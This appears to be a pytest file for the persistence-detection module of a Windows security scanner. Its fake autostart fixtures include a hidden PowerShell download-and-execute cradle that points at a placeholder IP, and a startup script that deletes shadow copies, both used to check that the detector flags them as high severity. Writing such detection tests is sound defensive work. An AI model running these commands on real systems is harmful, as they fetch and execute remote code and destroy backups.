"""persistence module: fake autostart fixtures (no registry or task changes are made)."""
from __future__ import annotations

from winsentinel.findings import ModuleResult
from winsentinel.modules import persistence
from winsentinel.modules.persistence import Entry
from winsentinel.winutil import exe_from_command, in_user_writable, unresolved_target

from conftest import no_sigcheck


def test_exe_from_command_forms():
    exe, args = exe_from_command(r'"C:\Windows\System32\notepad.exe" C:\x.txt')
    assert exe.lower().endswith(r"system32\notepad.exe") and args == r"C:\x.txt"
    exe, args = exe_from_command(r"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL")
    assert exe.lower().endswith("rundll32.exe") and args.startswith("shell32")
    exe, _ = exe_from_command("powershell.exe -NoProfile -File C:\\x.ps1")
    assert exe and exe.lower().endswith("powershell.exe")
    assert exe_from_command(r'"C:\does\not\exist.exe" -x')[0] is None
    assert unresolved_target(r"C:\does\not\exist.exe -x") == r"C:\does\not\exist.exe"


def test_user_writable_heuristic():
    assert in_user_writable(r"C:\Users\bob\AppData\Roaming\x\y.exe")
    assert not in_user_writable(r"C:\Program Files\Vendor\y.exe")


def _run(entries, monkeypatch, sig=no_sigcheck):
    monkeypatch.setattr(persistence, "check_signatures", sig)
    res = ModuleResult("persistence")
    persistence._analyse(res, entries, {"microsoft corporation", "microsoft windows"})
    return res


def test_fake_run_key_with_encoded_download_cradle_is_high(monkeypatch):
    cmd = ('powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient)'
           ".DownloadString('http://203.0.113.9/a.ps1')\"")
    res = _run([Entry("run-key", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Updater", cmd)], monkeypatch)
    assert len(res.findings) == 1
    f = res.findings[0]
    assert f.severity == "high"
    assert any("PS-DLEXEC" in s for s in f.signals) and any("PS-HIDDEN" in s for s in f.signals)
    assert f.rule_id == "PERSIST-RUN-KEY"


def test_fake_startup_script_content_is_scanned(monkeypatch, tmp_path):
    script = tmp_path / "start.cmd"
    script.write_text("@echo off\r\nvssadmin delete shadows /all /quiet\r\n", "utf-8")
    res = _run([Entry("startup-folder", str(tmp_path), "start.cmd", f'"{script}"')], monkeypatch)
    f = res.findings[0]
    assert f.severity == "high" and any("RANSOM" in s for s in f.signals)
    assert f.details["path"] == str(script)
    script.unlink()  # do not leave the planted fixture in %TEMP%


def test_trusted_signed_entry_is_not_listed(monkeypatch):
    def ms_signed(paths, chunk=200):
        return {p: {"status": "Valid", "signer": "Microsoft Windows", "os_binary": True} for p in paths}

    res = _run([Entry("service", r"services\Spooler", "Print Spooler", r"C:\Windows\System32\spoolsv.exe")], monkeypatch, ms_signed)
    assert res.findings == [] and res.coverage["trusted_signed_entries_not_listed"] == 1


def test_missing_target_is_reported(monkeypatch):
    res = _run([Entry("run-key", "HKCU\\...\\Run", "Ghost", r'"C:\Users\Public\gone\ghost.exe" /s')], monkeypatch)
    assert res.findings[0].severity == "low" and "missing" in res.findings[0].why
